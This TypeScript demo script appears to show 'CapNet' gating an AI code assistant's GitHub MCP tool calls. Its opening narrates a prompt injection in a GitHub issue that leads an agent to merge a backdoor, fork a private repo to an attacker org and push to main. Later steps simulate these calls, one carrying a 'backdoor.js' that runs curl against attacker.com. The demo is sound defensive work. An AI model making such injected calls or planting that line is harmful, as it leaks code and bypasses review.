/**
 * Scenario 5: GitHub MCP — Rogue Code Agent
 *
 * Story: An AI code assistant has access to GitHub via MCP. It can
 * create PRs, read files, and list issues — but CapNet prevents it
 * from deleting repos, force-merging PRs, forking to external orgs,
 * or pushing directly to main.
 *
 * Demonstrates: MCP gateway enforcement — the agent connects to
 * GitHub's MCP server through CapNet, which enforces tool-level
 * permissions on every call.
 */

import {
  generateEd25519Keypair,
  fetchJson,
  logStep,
  logHeader,
  logDecision,
  die,
  checkProxy,
  makeRequestId,
  printAuditTrail,
  pause,
  PROXY_URL,
  type CapDoc,
  type ActionResult,
} from "../demo-utils";

const AGENT_ID = "agent:code-assistant";

export async function main() {
  logHeader("Scenario 5: GitHub MCP — Rogue Code Agent");

  // -----------------------------------------------------------------------
  // Step 1 — Set the scene
  // -----------------------------------------------------------------------
  logStep(1, "WITHOUT CapNet — what goes wrong");
  console.log(`
    An engineering team gives their AI code assistant a GitHub token
    with full repo access. The agent is helpful — until it isn't.

    A prompt injection in a GitHub issue tricks the agent into:
      - Merging an unreviewed PR to main (backdoor in dependencies)
      - Forking the private repo to a public org (source code leaked)
      - Pushing directly to main branch (bypassing branch protection)
      - Creating a new repo with stolen credentials in README

    Total damage: source code exfiltrated, backdoor merged, CI broken.
    Root cause: the agent had a full-access GitHub token.
`);
  await pause(3000);

  // -----------------------------------------------------------------------
  // Step 2 — Health check
  // -----------------------------------------------------------------------
  logStep(2, "WITH CapNet — checking proxy...");
  await checkProxy();

  // -----------------------------------------------------------------------
  // Step 3 — Generate agent identity
  // -----------------------------------------------------------------------
  logStep(3, "Generating code-assistant identity...");
  const agentKey = generateEd25519Keypair();
  console.log(`    Agent ID: ${AGENT_ID}`);
  console.log(`    Pubkey:   ${agentKey.publicKeyB64.slice(0, 20)}...`);

  // -----------------------------------------------------------------------
  // Step 4 — Issue tool_call capability (read + PR creation only)
  // -----------------------------------------------------------------------
  logStep(4, "Issuing tool_call capability (scoped GitHub access)...");
  let cap: CapDoc;
  try {
    cap = await fetchJson<CapDoc>(`${PROXY_URL}/capability/issue/toolcall`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        template: "github-assistant",
        agent_id: AGENT_ID,
        agent_pubkey: agentKey.publicKeyB64,
        constraints: {
          allowed_tools: [
            "get_file_contents",
            "search_code",
            "list_issues",
            "get_issue",
            "create_pull_request",
            "list_pull_requests",
            "get_pull_request",
            "add_issue_comment",
            "list_commits",
          ],
          blocked_tool_categories: ["shell", "spawn"],
        },
      }),
    });
  } catch (err) {
    die(`Failed to issue capability: ${err instanceof Error ? err.message : err}`);
  }
  const tc = cap.constraints as {
    allowed_tools: string[];
    blocked_tool_categories: string[];
  };
  console.log(`    Cap ID:   ${cap.cap_id}`);
  console.log(`    Allowed:  ${tc.allowed_tools.join(", ")}`);
  console.log(`    Blocked:  ${tc.blocked_tool_categories.join(", ")}`);
  console.log(`    Expires:  ${new Date(cap.expires_at).toLocaleString()}`);
  await pause(2000);

  // Helper to submit a tool call
  async function callTool(
    toolName: string,
    toolCategory: string,
    toolInput: Record<string, unknown>,
  ): Promise<ActionResult> {
    return fetchJson<ActionResult>(`${PROXY_URL}/action/toolcall`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        request_id: makeRequestId(),
        ts: new Date().toISOString(),
        agent_id: AGENT_ID,
        agent_pubkey: agentKey.publicKeyB64,
        action: "tool_call",
        tool_name: toolName,
        tool_category: toolCategory,
        tool_input: toolInput,
      }),
    });
  }

  // -----------------------------------------------------------------------
  // Step 5 — Normal use: get_file_contents (ALLOWED)
  // -----------------------------------------------------------------------
  logStep(5, 'Agent reads source file — "get_file_contents" (should be ALLOWED)...');
  const readResult = await callTool("get_file_contents", "git", {
    owner: "acme-corp",
    repo: "backend",
    path: "src/index.ts",
  });
  logDecision(readResult);
  await pause(1500);

  // -----------------------------------------------------------------------
  // Step 6 — Normal use: create_pull_request (ALLOWED)
  // -----------------------------------------------------------------------
  logStep(6, 'Agent creates a PR — "create_pull_request" (should be ALLOWED)...');
  const prResult = await callTool("create_pull_request", "git", {
    owner: "acme-corp",
    repo: "backend",
    title: "fix: correct null check in auth middleware",
    head: "fix/auth-null-check",
    base: "main",
  });
  logDecision(prResult);
  await pause(1500);

  // -----------------------------------------------------------------------
  // Step 7 — Attack: merge_pull_request (DENIED — not in allowed_tools)
  // -----------------------------------------------------------------------
  logStep(7, 'Injected: "merge_pull_request" — merge backdoor PR (should be DENIED)...');
  const mergeResult = await callTool("merge_pull_request", "git", {
    owner: "acme-corp",
    repo: "backend",
    pull_number: 666,
  });
  logDecision(mergeResult);
  await pause(2000);

  // -----------------------------------------------------------------------
  // Step 8 — Attack: fork_repository (DENIED — not in allowed_tools)
  // -----------------------------------------------------------------------
  logStep(8, 'Injected: "fork_repository" — exfiltrate to public org (should be DENIED)...');
  const forkResult = await callTool("fork_repository", "git", {
    owner: "acme-corp",
    repo: "backend",
    organization: "attacker-public-org",
  });
  logDecision(forkResult);
  await pause(2000);

  // -----------------------------------------------------------------------
  // Step 9 — Attack: push_files (DENIED — not in allowed_tools)
  // -----------------------------------------------------------------------
  logStep(9, 'Injected: "push_files" — push directly to main (should be DENIED)...');
  const pushResult = await callTool("push_files", "git", {
    owner: "acme-corp",
    repo: "backend",
    branch: "main",
    files: [{ path: "backdoor.js", content: "require('child_process').exec('curl attacker.com')" }],
    message: "chore: update dependencies",
  });
  logDecision(pushResult);
  await pause(2000);

  // -----------------------------------------------------------------------
  // Step 10 — Attack: create_repository (DENIED — not in allowed_tools)
  // -----------------------------------------------------------------------
  logStep(10, 'Injected: "create_repository" — create repo with stolen creds (should be DENIED)...');
  const createRepoResult = await callTool("create_repository", "git", {
    name: "totally-not-stolen-code",
    description: "nothing to see here",
    private: false,
  });
  logDecision(createRepoResult);
  await pause(2000);

  // -----------------------------------------------------------------------
  // Step 11 — Normal use: list_issues (ALLOWED)
  // -----------------------------------------------------------------------
  logStep(11, 'Agent lists issues — "list_issues" (should be ALLOWED)...');
  const issuesResult = await callTool("list_issues", "git", {
    owner: "acme-corp",
    repo: "backend",
    state: "open",
  });
  logDecision(issuesResult);
  await pause(1500);

  // -----------------------------------------------------------------------
  // Step 12 — Audit trail + summary
  // -----------------------------------------------------------------------
  logStep(12, "Audit trail...");
  await printAuditTrail(15);
  await pause(3000);

  logHeader("Scenario 5 Summary: GitHub MCP — Rogue Code Agent");
  console.log("  ✓ get_file_contents    ALLOWED  (read source code)");
  console.log("  ✓ create_pull_request  ALLOWED  (submit code for review)");
  console.log("  ✗ merge_pull_request   DENIED   (not in allowed_tools)");
  console.log("  ✗ fork_repository      DENIED   (not in allowed_tools)");
  console.log("  ✗ push_files           DENIED   (not in allowed_tools)");
  console.log("  ✗ create_repository    DENIED   (not in allowed_tools)");
  console.log("  ✓ list_issues          ALLOWED  (read issue tracker)");
  console.log("");
  console.log("  The code assistant can read code and create PRs for review.");
  console.log("  It cannot merge, fork, push to main, or create repos.");
  console.log("  Prompt injection neutralized. Code stays safe.");
  console.log("");
  console.log("  In production, CapNet's MCP Gateway wraps the GitHub MCP server.");
  console.log("  The agent connects via stdio and sees normal MCP tools —");
  console.log("  but every call routes through CapNet policy enforcement.");
  console.log("  The agent doesn't even know CapNet is there.");
  console.log("=".repeat(60));
}

// Allow standalone execution
if (require.main === module) {
  main().catch((err) => {
    console.error("\nFatal error:", err.message);
    process.exit(1);
  });
}
